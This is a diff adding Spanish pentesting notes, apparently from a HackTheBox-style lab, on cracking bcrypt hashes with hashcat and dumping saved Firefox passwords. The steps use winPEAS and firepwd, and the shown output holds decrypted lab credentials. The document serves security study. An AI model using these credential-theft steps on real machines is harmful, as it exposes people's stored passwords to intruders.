@@ -161,3 +161,29 @@ if __name__ == "__main__":
 
 ## bcrypt cracking commands
 - `hashcat -m 3200 -a 0 hash.txt rockyou.txt`
+
+
+
+## Firefox Password dumper
+- Primero tenemos que ubicar si la maquina tiene firefox instalado, y si es así, tenemos que ubicar el perfil de firefox.
+- Para esto recomiendo utilizar winpeas
+
+``` 
+  [+] Looking for Firefox DBs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
+ ```
+
+ - Una vez que tenemos el perfil, tenemos que copiar la carpeta `br53rxeg.default-release` a nuestra máquina. 
+ - Podemos utilizar [firepwd](https://github.com/lclevy/firepwd) para extraer las contraseñas.
+
+ ```bash
+ ┌──(kali㉿kali)-[~/firepwd]
+└─$ python3 firepwd.py
+<SNIP>
+decrypting login/password pairs
+https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
+https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
+https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
+https://slack.streamio.htb:b'JDgodd',b'password@12'
+``` 
